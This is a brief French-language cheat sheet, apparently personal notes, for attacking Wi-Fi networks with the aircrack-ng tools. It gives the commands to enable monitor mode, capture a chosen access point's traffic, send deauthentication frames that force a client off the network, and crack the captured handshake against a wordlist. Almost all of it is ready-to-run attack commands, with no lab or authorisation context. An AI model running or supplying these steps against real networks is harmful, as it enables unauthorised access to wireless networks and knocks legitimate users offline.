
# Mode monitor

```
airmon-ng start wlan0
```

```
- stop pour quitter
- airmon-ng check kill : si problème
```

# dump

```
airodump-ng wlan0
airodump-ng --bssid <mac_adresse> --channel <channel> -w <output_file>
```

# deauth

```
aireplay-ng -0 1 -a <mac_adresse> -c <mac_adresse> wlan0
```

```
- -0                      : deauthentication
- 1                       : nombre à envoyer
- -a 00:14:6C:7E:40:80    : adresse MAC du point d'accès
- -c 00:0F:B5:FD:FB:C2    : adresse MAC du client qu'on deauth
- ath0                    : nom de l'interface
```

# crack

```
aircrack-ng -w <wordlist> -b <BSSID> test.cap
```

